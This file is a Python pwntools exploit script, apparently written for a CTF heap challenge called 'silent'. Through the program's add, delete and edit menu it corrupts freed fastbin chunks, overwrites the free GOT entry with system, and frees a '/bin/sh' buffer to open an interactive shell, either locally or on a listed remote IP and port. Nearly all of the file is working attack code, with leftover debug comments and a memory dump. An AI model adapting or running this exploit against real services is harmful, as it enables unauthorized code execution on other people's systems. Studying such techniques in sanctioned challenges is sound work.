# coding:utf-8
from pwn import *
import ctypes
import sys
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
so = ctypes.CDLL('/home/moonagirl/moonagirl/libc/libc_local_x64')
# a = so.rand()
elf = ELF('./silent')
system_plt = elf.plt['system']
LOCAL = 1
if LOCAL:
#   context.log_level = 'debug'
    io = process('./silent')#,env={"LD_PRELOAD":"./libc-2.24.so"})
#    __malloc_hook+68
    
else:
    main_arena_off = 0x3c4b78
    #io = remote("47.90.103.10", 6000)
    io = remote("39.107.32.132", 10000)
def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def add(size,buf):
    io.sendline('1')
    sleep(0.2)
    io.sendline(str(size))
    sleep(0.2)
    io.send(buf)
    sleep(0.2)

def delete(id):
    io.sendline('2')
    sleep(0.2)
    io.sendline(str(id))
    sleep(0.2)

def edit(id,buf1,buf2):
    io.sendline('3')
    sleep(0.2)
    io.sendline(str(id))
    sleep(0.2)
    io.send(buf1)
    sleep(0.2)
    io.send(buf2)

free_hook = libc.symbols['__free_hook']
ptr = 0x00000000006020C0
system_addr = elf.symbols["system"]
print 'free_hook:' + hex(free_hook)
print 'free_got:' + hex(elf.got['free'])
print 'free_plt:' + hex(elf.got['strlen'])
print 'system_got:' + hex(elf.got['system'])

def pwnit():
	add(0x60,"A"*8)
	sleep(1)
	add(0x60,"A"*8)
	sleep(1)
	add(0x60,"A"*8)
	sleep(1)
	delete(0)
	sleep(1)
	delete(1)
	sleep(1)
	delete(2)
	sleep(1)

	#fake_chunk = p64(0) + p64(0x71)
	#fake_chunk = fake_chunk.ljust(0x2F, 'k')
	edit(2, p64(0x6020A5-8)[:3] + chr(0),'')# fake_chunk)
	sleep(1)
	padding = 'a'*0x13
	padding += p64(0x602018)
	add(0x60,"/bin/sh\x00")#3
	sleep(1)
	add(0x60,padding)#4
	sleep(1)
	edit(0, p64(system_addr),p64(system_addr))
	sleep(1)
#	z()
	delete(3)
	sleep(1)

#s.interactive()

#	add(0x60,'B'*0x10) #2
#	sleep(1)
#	z()
#	delete(1)
#	io.interactive()
	#p64(0)+p64(0x71)+p64(elf.got['free']-0x10)*2
#	z()
	io.interactive()
 #   z()
    
    

if __name__ == "__main__":
    pwnit()
    # pause()
#$2 = (void (**)(void *, const void *)) 0x7f001d3ed7a8 <__free_hook>
# 0x601ff0:	0x0000000000000000			
# 0x601ff8: 0x0000000000000000
# 0x602000:	
#           281e 60000000000000
# 0x602008:	0x00007f5a5c153168 <-
# 0x602010:	0x00007f5a5bf43870

# 0x602018: 0x00007f5a5bbe64f0
# 0x602020:	0x00007f5a5bbed720	0x0000000000400726
# 0x602030:	0x00007f5a5bba7390	0x00007f5a5bc59250
# 0x602040:	0x00007f5a5bb82740	0x00007f5a5bbd8160
#	io.interactive()
#	z()
	# io.sendlineline('3')
	# io.sendlineline(str(3))
	# io.sendlineline('')
	# io.sendlineline(p64(0)+p64(0x61)+p64(0x602138)+p64(0)+p64(0x61)+p64(elf.got['free'] - 0x10))

	# z()